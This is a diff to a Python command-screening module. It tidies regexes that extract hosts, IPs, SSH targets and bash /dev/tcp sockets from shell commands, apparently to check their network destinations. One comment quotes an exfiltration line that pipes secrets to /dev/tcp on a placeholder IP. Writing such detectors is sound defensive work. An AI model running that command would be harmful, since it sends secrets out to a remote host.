@@ -344,7 +344,7 @@ _URL_RE = re.compile(r"""(?:^|[\s"'=(])((?:https?|ftp)://[^\s"'`)|;<>]+)""",
 # from reading its OUTPUT FILE as a destination — the false positive that would
 # have refused a perfectly allowed fetch because of the -o argument.
 _BARE_HOST_RE = re.compile(
-    r"^(?!-)[A-Za-z0-9-]{1,63}(?:\.[A-Za-z0-9-]{1,63})*\.(?:[A-Za-z]{2,24})$")
+    r"^(?!-)[A-Za-z0-9-]{1,63}(?:\.[A-Za-z0-9-]{1,63})*\.[A-Za-z]{2,24}$")
 _IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
 # Options whose VALUE is a local path, never a destination.
 # Endings that make a token a local file rather than a host. `curl out.html`
@@ -387,7 +387,7 @@ _SSH_TARGET_RE = re.compile(
     r"(?:\.[A-Za-z0-9-]{1,63})*\.(?:[A-Za-z]{2,24})|\d{1,3}(?:\.\d{1,3}){3})"
     r":(?:.*)?$")
 _SSH_HOST_RE = re.compile(
-    r"^(?:[A-Za-z0-9._%+-]+@)((?!-)[A-Za-z0-9.-]+)$")
+    r"^[A-Za-z0-9._%+-]+@((?!-)[A-Za-z0-9.-]+)$")
 # bash's own socket: `cat secrets > /dev/tcp/1.2.3.4/443`. No binary involved,
 # so nothing that looks for a command name will ever see it.
 _DEV_TCP_RE = re.compile(r"/dev/(?:tcp|udp)/([A-Za-z0-9._-]+)/\d+")
